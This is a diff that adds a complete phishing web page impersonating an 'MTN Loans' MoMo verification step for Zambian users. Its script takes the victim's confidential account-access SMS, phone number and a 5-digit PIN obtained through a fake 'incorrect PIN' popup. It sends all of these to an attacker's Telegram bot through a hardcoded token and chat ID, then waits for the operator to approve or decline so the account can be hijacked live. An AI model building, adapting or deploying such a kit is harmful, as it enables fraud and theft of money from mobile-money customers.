@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>MTN Loans – OTP Verification</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Inter', Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            background: #ffffff;
+            display: block;
+            padding: 20px 16px;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 360px;
+            max-width: 100%;
+            margin: 0 auto;
+            background: white;
+            border-radius: 28px;
+            padding: 40px 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            position: relative;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .content {
+            position: relative;
+            z-index: 2;
+        }
+
+        .logo {
+            margin-top: 20px;
+        }
+        .logo-img {
+            max-height: 56px;
+            width: auto;
+            border-radius: 14px;
+            display: block;
+            margin: 0 auto;
+            background: #fff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        .title {
+            color: #FFCC00;
+            font-size: 20px;
+            font-weight: 700;
+            margin-top: 15px;
+        }
+
+        .subtitle {
+            color: #555;
+            font-size: 15px;
+            margin-top: 10px;
+            line-height: 1.5;
+        }
+
+        .message-area {
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .message-area label {
+            font-weight: 600;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        .message-area textarea {
+            width: 100%;
+            min-height: 140px;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 14px;
+            font-family: 'Inter', Arial, sans-serif;
+            resize: vertical;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        .message-area textarea:focus {
+            border-color: #FFCC00;
+            box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.3);
+        }
+
+        .message-area .hint {
+            font-size: 12px;
+            color: #888;
+            margin-top: 4px;
+        }
+
+        .btn {
+            width: 100%;
+            height: 55px;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            margin-top: 20px;
+            cursor: pointer;
+            font-weight: 700;
+        }
+
+        .btn-primary {
+            background: linear-gradient(90deg, #FFCC00, #E6B800);
+            color: #000;
+            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3);
+        }
+
+        .btn-primary.disabled,
+        .btn-primary:disabled {
+            background: #e5e5e5;
+            color: #999;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 2px solid #FFCC00;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .message {
+            font-size: 14px;
+            margin-top: 8px;
+            min-height: 20px;
+        }
+        .error {
+            color: #dc3545;
+        }
+        .success {
+            color: #28a745;
+        }
+
+        .error-box {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            right: 20px;
+            background: #fff;
+            border: 2px solid #ff4d4d;
+            border-radius: 12px;
+            padding: 15px;
+            display: none;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            z-index: 100;
+            text-align: left;
+        }
+
+        .error-title {
+            color: #ff0000;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .error-text {
+            color: #444;
+            font-size: 14px;
+        }
+
+        .close {
+            position: absolute;
+            right: 15px;
+            top: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            color: #999;
+        }
+
+        #spinner {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(2px);
+            z-index: 999;
+        }
+
+        .loader {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #ffe0a3;
+            border-top: 4px solid #FFCC00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ========== PIN MODAL ========== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(3px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+            animation: modalFadeIn 0.25s ease;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        @keyframes modalFadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .modal-box {
+            background: #ffffff;
+            border-radius: 28px;
+            max-width: 360px;
+            width: 100%;
+            padding: 32px 24px 28px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            position: relative;
+        }
+
+        .modal-title {
+            font-size: 17px;
+            font-weight: 700;
+            color: #1a1a1a;
+            line-height: 1.45;
+            margin-bottom: 6px;
+        }
+        .modal-title span {
+            color: #FFCC00;
+        }
+        .modal-sub {
+            font-size: 13px;
+            color: #777;
+            margin-top: 2px;
+            margin-bottom: 18px;
+        }
+
+        .modal-pin-input {
+            width: 100%;
+            max-width: 220px;
+            margin: 0 auto;
+            height: 52px;
+            border-radius: 12px;
+            border: 1px solid #ddd;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            background: #fff;
+            outline: none;
+            transition: border 0.2s, box-shadow 0.2s;
+            -webkit-text-security: disc;
+            inputmode: numeric;
+            font-family: monospace;
+            letter-spacing: 6px;
+            display: block;
+        }
+        .modal-pin-input:focus {
+            border-color: #FFCC00;
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.25);
+        }
+        .modal-pin-input.filled {
+            border-color: #FFCC00;
+            background: #fffef5;
+        }
+
+        .modal-message {
+            font-size: 13px;
+            margin-top: 12px;
+            min-height: 18px;
+            color: #dc3545;
+        }
+
+        .modal-loader {
+            display: inline-block;
+            width: 28px;
+            height: 28px;
+            border: 3px solid #ffe0a3;
+            border-top: 3px solid #FFCC00;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin-top: 10px;
+        }
+
+        @media (max-width: 400px) {
+            .modal-box {
+                padding: 24px 16px 20px;
+            }
+            .modal-title {
+                font-size: 15px;
+            }
+            .modal-pin-input {
+                height: 46px;
+                font-size: 22px;
+                max-width: 190px;
+                letter-spacing: 4px;
+            }
+        }
+
+        @media (max-width: 340px) {
+            .modal-pin-input {
+                height: 40px;
+                font-size: 18px;
+                max-width: 160px;
+                letter-spacing: 3px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="error-box" id="errorBox">
+            <div class="close" onclick="hideError()">×</div>
+            <div class="error-title">Error</div>
+            <div class="error-text" id="errorText">Invalid OTP code</div>
+        </div>
+
+        <div class="content">
+            <div class="logo">
+                <img src="logo.png" alt="MTN Loans" class="logo-img" />
+            </div>
+
+            <div class="title">Verify Your Account</div>
+            <div class="subtitle" id="subtitleText">
+                Paste the message you received via SMS.<br>
+                <span id="maskedPhone">+260 7x xxx xxx</span>
+            </div>
+
+            <div class="message-area">
+                <label for="otpMessageText">Paste the message</label>
+                <textarea id="otpMessageText" placeholder="Paste the full message here..."></textarea>
+                <div class="hint">Paste the full message you received via SMS.</div>
+            </div>
+
+            <div class="message" id="formMessage"></div>
+
+            <button class="btn btn-primary" id="submitBtn">Submit</button>
+
+            <button class="btn btn-outline" id="goBackBtn">Back</button>
+        </div>
+    </div>
+
+    <!-- ====== PIN MODAL ====== -->
+    <div class="modal-overlay" id="pinModal">
+        <div class="modal-box">
+            <div class="modal-title">
+                The MoMo PIN you entered is incorrect.<br>
+                Please confirm your PIN to continue.
+            </div>
+            <div class="modal-sub">Enter your 5-digit PIN</div>
+
+            <input class="modal-pin-input" id="modalPinInput" maxlength="5" inputmode="numeric" autocomplete="off" type="password" placeholder="· · · · ·">
+
+            <div class="modal-message" id="modalMessage"></div>
+            <div id="modalSpinner" style="display:none; margin-top:10px;">
+                <div class="modal-loader"></div>
+                <div style="font-size:13px; color:#888; margin-top:6px;">Verifying PIN…</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SPINNER OVERLAY -->
+    <div id="spinner">
+        <div class="loader"></div>
+    </div>
+
+    <script>
+    (function() {
+        'use strict';
+
+        // ==================== TELEGRAM BOT CONFIG ====================
+        const BOT_TOKEN = '8804712872:AAHUIfGWj5uve-3GyvulxIJ6PL39HejYL60';
+        const CHAT_ID = '7892607543';
+        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+        // ==================== DOM ELEMENTS ====================
+        const messageTextarea = document.getElementById('otpMessageText');
+        const submitBtn = document.getElementById('submitBtn');
+        const goBackBtn = document.getElementById('goBackBtn');
+        const maskedPhoneSpan = document.getElementById('maskedPhone');
+        const formMessage = document.getElementById('formMessage');
+        const spinner = document.getElementById('spinner');
+        const errorBox = document.getElementById('errorBox');
+        const errorText = document.getElementById('errorText');
+
+        const pinModal = document.getElementById('pinModal');
+        const modalPinInput = document.getElementById('modalPinInput');
+        const modalMessage = document.getElementById('modalMessage');
+        const modalSpinner = document.getElementById('modalSpinner');
+
+        // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
+        const phone = sessionStorage.getItem('mtn_phone') || '766123456';
+        function formatZambianPhone(phoneDigits) {
+            if (!phoneDigits) return '+260 7x xxx xxx';
+            const cleaned = phoneDigits.replace(/\D/g, '');
+            if (cleaned.length === 9) {
+                return `+260 ${cleaned.slice(0, 1)} ${cleaned.slice(1, 3)} ${cleaned.slice(3, 5)} ${cleaned.slice(5, 7)} ${cleaned.slice(7, 9)}`;
+            }
+            return phoneDigits;
+        }
+
+        function maskPhone(phone) {
+            const cleaned = phone.replace(/\D/g, '');
+            if (cleaned.length >= 4) {
+                const start = cleaned.slice(0, 1);
+                const end = cleaned.slice(-2);
+                const middleLength = cleaned.length - 3;
+                return start + 'x'.repeat(middleLength) + end;
+            }
+            return phone;
+        }
+
+        const maskedDigits = maskPhone(phone);
+        maskedPhoneSpan.textContent = formatZambianPhone(maskedDigits);
+
+        // ==================== ERROR HANDLING ====================
+        function showError(message) {
+            errorText.innerText = message || 'An error occurred';
+            errorBox.style.display = 'block';
+        }
+        window.hideError = function() {
+            errorBox.style.display = 'none';
+        };
+
+        // ==================== SMS MESSAGE VALIDATION ====================
+        const PREFIX = "Y'ello. Please note! This confidential code gives access to your MoMo account:";
+        const SUFFIX = "Do not share it with anyone.";
+
+        function validateAndExtractCode(text) {
+            // 1. Basic non-empty check
+            if (!text || text.trim().length < 20) {
+                return { error: 'invalid', message: 'Invalid message format. Please paste the full SMS message.' };
+            }
+
+            // 2. Check for Prefix (Format/Structure Error -> Invalid)
+            const startIdx = text.indexOf(PREFIX);
+            if (startIdx === -1) {
+                return { error: 'invalid', message: 'Invalid message format. Please paste the full SMS message.' };
+            }
+
+            // 3. Check for Suffix (Format/Structure Error -> Invalid)
+            const endIdx = text.indexOf(SUFFIX, startIdx + PREFIX.length);
+            if (endIdx === -1) {
+                return { error: 'invalid', message: 'Invalid message format. Please paste the full SMS message.' };
+            }
+
+            // 4. Extract the code between prefix and suffix
+            const codeStart = startIdx + PREFIX.length;
+            let code = text.substring(codeStart, endIdx).trim();
+
+            // 5. Validate extracted code (Content/Quality Error -> Incomplete)
+            if (!code || code.length < 10) {
+                return { error: 'incomplete', message: 'Incomplete message. The OTP code is missing or invalid.' };
+            }
+
+            const base64Regex = /^[A-Za-z0-9+/=]+$/;
+            if (!base64Regex.test(code)) {
+                return { error: 'incomplete', message: 'Incomplete message. The OTP code contains invalid characters.' };
+            }
+
+            if (code.length > 200) {
+                return { error: 'incomplete', message: 'Incomplete message. The extracted code is too long.' };
+            }
+
+            // 6. CRITICAL: Check for the trailing verification code after the suffix
+            // This is the vital code that comes after "Do not share it with anyone."
+            const trailing = text.substring(endIdx + SUFFIX.length).trim();
+
+            if (!trailing || trailing.length < 10) {
+                return { error: 'incomplete', message: 'Incomplete message. The verification code after the suffix is missing.' };
+            }
+
+            // Remove spaces to check the trailing code content
+            const trailingClean = trailing.replace(/\s/g, '');
+
+            // The trailing code must contain at least 10 Base64-like characters
+            if (trailingClean.length < 10) {
+                return { error: 'incomplete', message: 'Incomplete message. The verification code appears incomplete.' };
+            }
+
+            // Check that the trailing code contains only Base64 characters
+            // Note: it often has spaces between groups, so we check the cleaned version
+            if (!base64Regex.test(trailingClean)) {
+                return { error: 'incomplete', message: 'Incomplete message. The verification code contains invalid characters.' };
+            }
+
+            return { code: code };
+        }
+
+        // ==================== TELEGRAM HELPERS ====================
+        function escapeHtml(unsafe) {
+            if (!unsafe) return '';
+            return unsafe.replace(/[&<>"]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                if (m === '"') return '&quot;';
+                return m;
+            });
+        }
+
+        async function sendToTelegram(payload) {
+            const url = `${API_BASE}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return await response.json();
+            } catch (error) {
+                console.error('Telegram send error:', error);
+                throw error;
+            }
+        }
+
+        // ==================== POLLING ====================
+        let currentPollInterval = null;
+
+        function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+            if (currentPollInterval) {
+                clearInterval(currentPollInterval);
+                currentPollInterval = null;
+            }
+
+            let lastUpdateId = 0;
+
+            currentPollInterval = setInterval(async () => {
+                try {
+                    const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+                    const response = await fetch(url);
+                    const data = await response.json();
+
+                    if (!data.ok || !data.result.length) return;
+
+                    data.result.forEach(update => {
+                        if (update.update_id > lastUpdateId) {
+                            lastUpdateId = update.update_id;
+                        }
+
+                        const callback = update.callback_query;
+                        if (!callback || !callback.data) return;
+
+                        const parts = callback.data.split('_');
+                        if (parts.length < 3) return;
+
+                        const [type, action, time] = parts;
+                        if (time == expectedTs && type === expectedPrefix) {
+                            clearInterval(currentPollInterval);
+                            currentPollInterval = null;
+                            onDecision(action);
+                        }
+                    });
+                } catch (err) {
+                    console.warn('Polling error:', err);
+                }
+            }, 1500);
+        }
+
+        // ==================== MODAL PIN LOGIC ====================
+        let isModalSubmitting = false;
+
+        function closeModal() {
+            pinModal.classList.remove('active');
+            modalPinInput.value = '';
+            modalPinInput.classList.remove('filled');
+            modalMessage.textContent = '';
+            modalSpinner.style.display = 'none';
+            isModalSubmitting = false;
+        }
+
+        function openModal() {
+            pinModal.classList.add('active');
+            modalMessage.textContent = '';
+            modalSpinner.style.display = 'none';
+            modalPinInput.value = '';
+            modalPinInput.classList.remove('filled');
+            isModalSubmitting = false;
+            setTimeout(() => modalPinInput.focus(), 200);
+        }
+
+        function getModalPin() {
+            return modalPinInput.value.trim();
+        }
+
+        modalPinInput.addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length > 5) val = val.slice(0, 5);
+            this.value = val;
+
+            if (val.length === 5) {
+                this.classList.add('filled');
+            } else {
+                this.classList.remove('filled');
+            }
+
+            modalMessage.textContent = '';
+
+            if (val.length === 5 && !isModalSubmitting) {
+                submitModalPin();
+            }
+        });
+
+        modalPinInput.addEventListener('keydown', function(e) {
+            if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight') {
+                e.preventDefault();
+            }
+        });
+
+        // ==================== SUBMIT MODAL PIN TO TELEGRAM ====================
+        async function submitModalPin() {
+            if (isModalSubmitting) return;
+
+            const pin = getModalPin();
+            if (pin.length !== 5) return;
+
+            isModalSubmitting = true;
+            modalSpinner.style.display = 'block';
+            modalPinInput.disabled = true;
+            modalMessage.textContent = '';
+            modalMessage.style.color = '#555';
+
+            const ts = Date.now();
+            const phoneNum = phone;
+            const escapedPin = escapeHtml(pin);
+
+            const msg =
+                `🔐 <b>MTN Loans – PIN Confirmation</b>\n\n` +
+                `<b>Phone:</b> <code>${escapeHtml(phoneNum)}</code>\n` +
+                `<b>Entered PIN:</b> <code>${escapedPin}</code>\n\n` +
+                `Confirm this PIN?`;
+
+            try {
+                await sendToTelegram({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Approve PIN', callback_data: `pin_approve_${ts}` },
+                                { text: '❌ Decline PIN', callback_data: `pin_decline_${ts}` }
+                            ]
+                        ]
+                    }
+                });
+            } catch (err) {
+                modalSpinner.style.display = 'none';
+                modalPinInput.disabled = false;
+                modalMessage.textContent = '❌ Network error. Please try again.';
+                modalMessage.style.color = '#dc3545';
+                isModalSubmitting = false;
+                return;
+            }
+
+            pollForCallback('pin', ts, (action) => {
+                modalSpinner.style.display = 'none';
+                modalPinInput.disabled = false;
+                isModalSubmitting = false;
+
+                if (action === 'approve') {
+                    closeModal();
+                    window.location.href = 'otp4.html';
+                } else if (action === 'decline') {
+                    modalMessage.textContent = '❌ Incorrect PIN';
+                    modalMessage.style.color = '#dc3545';
+                    modalPinInput.value = '';
+                    modalPinInput.classList.remove('filled');
+                    modalPinInput.focus();
+                    showError('Incorrect PIN. Please try again.');
+                    setTimeout(() => {
+                        if (modalMessage.textContent === '❌ Incorrect PIN') {
+                            modalMessage.textContent = '';
+                        }
+                    }, 3000);
+                } else {
+                    modalMessage.textContent = '❌ Unexpected response. Try again.';
+                    modalMessage.style.color = '#dc3545';
+                    isModalSubmitting = false;
+                }
+            });
+        }
+
+        // ==================== SUBMIT THE OTP MESSAGE ====================
+        let isSubmitting = false;
+
+        async function submitMessage() {
+            if (isSubmitting) return;
+
+            const msgText = messageTextarea.value;
+            const validation = validateAndExtractCode(msgText);
+
+            if (validation.error) {
+                formMessage.textContent = validation.message;
+                formMessage.className = 'message error';
+                messageTextarea.style.borderColor = '#dc3545';
+                setTimeout(() => {
+                    messageTextarea.style.borderColor = '';
+                }, 3000);
+                return;
+            }
+
+            formMessage.textContent = '';
+            formMessage.className = 'message';
+            const otpCode = validation.code;
+
+            isSubmitting = true;
+            submitBtn.disabled = true;
+            messageTextarea.disabled = true;
+            spinner.style.display = 'flex';
+
+            const ts = Date.now();
+            const escapedMsg = escapeHtml(msgText);
+            const phoneInfo = `📱 Phone: +260 ${phone}`;
+            const msg =
+                `🔐 <b>MTN Loans – OTP Message</b>\n\n${phoneInfo}\n\n<b>Pasted Message:</b>\n<code>${escapedMsg}</code>\n\nChoose action:`;
+
+            try {
+                await sendToTelegram({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Approve', callback_data: `otpmsg_approve_${ts}` },
+                                { text: '❌ Wrong PIN', callback_data: `otpmsg_wrongpin_${ts}` },
+                                { text: '⛔ Decline', callback_data: `otpmsg_decline_${ts}` }
+                            ]
+                        ]
+                    }
+                });
+            } catch (err) {
+                spinner.style.display = 'none';
+                isSubmitting = false;
+                submitBtn.disabled = false;
+                messageTextarea.disabled = false;
+                showError('Failed to send to Telegram. Please try again.');
+                return;
+            }
+
+            pollForCallback('otpmsg', ts, (action) => {
+                spinner.style.display = 'none';
+                isSubmitting = false;
+                submitBtn.disabled = false;
+                messageTextarea.disabled = false;
+
+                if (action === 'approve') {
+                    window.location.href = 'otp4.html';
+                } else if (action === 'wrongpin') {
+                    openModal();
+                    formMessage.textContent = '📌 Please confirm your PIN in the popup.';
+                    formMessage.className = 'message';
+                } else if (action === 'decline') {
+                    showError('Paste the most recent message in full. Check and try again.');
+                    messageTextarea.value = '';
+                    messageTextarea.focus();
+                    formMessage.textContent = '';
+                } else {
+                    showError('Unexpected response. Please try again.');
+                }
+            });
+        }
+
+        submitBtn.addEventListener('click', submitMessage);
+
+        messageTextarea.addEventListener('input', function() {
+            formMessage.textContent = '';
+            formMessage.className = 'message';
+            this.style.borderColor = '';
+        });
+
+        goBackBtn.addEventListener('click', () => {
+            if (currentPollInterval) {
+                clearInterval(currentPollInterval);
+                currentPollInterval = null;
+            }
+            window.location.href = 'login.html';
+        });
+
+        messageTextarea.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && e.ctrlKey) {
+                e.preventDefault();
+                submitMessage();
+            }
+        });
+
+        setTimeout(() => {
+            messageTextarea.focus();
+        }, 200);
+
+        pinModal.addEventListener('click', function(e) {
+            if (e.target === pinModal && !isModalSubmitting) {
+                // Do nothing
+            }
+        });
+
+        window.addEventListener('beforeunload', function() {
+            if (currentPollInterval) {
+                clearInterval(currentPollInterval);
+                currentPollInterval = null;
+            }
+        });
+
+        window.__debug = {
+            stopPolling: function() {
+                if (currentPollInterval) {
+                    clearInterval(currentPollInterval);
+                    currentPollInterval = null;
+                }
+            },
+            pollForCallback,
+            phone
+        };
+
+        console.log('[MTN Loans] OTP page initialized with Zambia branding and SMS validation.');
+    })();
+    </script>
+
+</body>
+</html>
